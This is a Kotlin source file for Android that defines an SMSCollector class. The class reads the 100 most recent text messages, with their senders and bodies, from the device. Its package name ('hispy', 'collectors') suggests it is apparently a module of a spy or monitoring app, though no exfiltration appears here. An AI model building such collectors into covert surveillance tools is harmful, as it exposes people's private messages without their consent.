package com.ufc.hispy.collectors

import android.content.Context
import android.provider.Telephony
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

data class SMSMessage(
    val id: String,
    val address: String,
    val body: String,
    val date: Long,
    val type: Int
)

class SMSCollector(private val context: Context) {
    
    suspend fun collectSMS(): List<SMSMessage> = withContext(Dispatchers.IO) {
        val messages = mutableListOf<SMSMessage>()
        
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
            ),
            null,
            null,
            Telephony.Sms.DATE + " DESC LIMIT 100"
        )
        
        cursor?.use {
            val idIndex = it.getColumnIndex(Telephony.Sms._ID)
            val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
            val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
            val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
            
            while (it.moveToNext()) {
                messages.add(SMSMessage(
                    id = it.getString(idIndex),
                    address = it.getString(addressIndex),
                    body = it.getString(bodyIndex),
                    date = it.getLong(dateIndex),
                    type = it.getInt(typeIndex)
                ))
            }
        }
        
        return@withContext messages
    }
}